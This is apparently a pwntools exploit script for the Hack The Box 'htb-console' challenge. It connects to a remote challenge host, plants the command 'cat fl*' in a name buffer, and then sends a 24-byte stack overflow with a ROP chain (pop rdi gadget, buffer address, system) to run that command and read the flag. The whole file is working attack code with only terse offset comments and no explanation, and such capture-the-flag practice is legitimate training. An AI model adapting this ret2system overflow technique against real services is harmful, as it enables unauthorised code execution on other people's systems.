#ebp is offset 16
#so ret should be offset 24
#maximum read 48 0x30

from pwn import *

context.arch = 'x86_64'

# p = process('./htb-console')
p = remote('46.101.63.43', 30252)

#system is linked at 0x401040
#could include buffer as argument?
#static_name_buf 0x4040b0  max length 16

NAME_CMD_BUF = 0x4040b0
SYSTEM_IMPORT = 0x401040
#0x0000000000401473 : pop rdi ; ret
POP_RDI = 0x0000000000401473

print(p.recv())
p.sendline('hof')
print(p.recv())
p.sendline('cat fl*') #store cmd arg into name buf
print(p.recv())
p.sendline('flag')
print(p.recv())

binary = ELF('./htb-console')
rop = ROP(binary)

#mov address of buffer into edi
#call system
junk = 'A' * 24

payload = junk.encode('latin-1')
payload += p64(POP_RDI) + p64(NAME_CMD_BUF)
payload += p64(SYSTEM_IMPORT)

p.sendline(payload)
print(p.recv())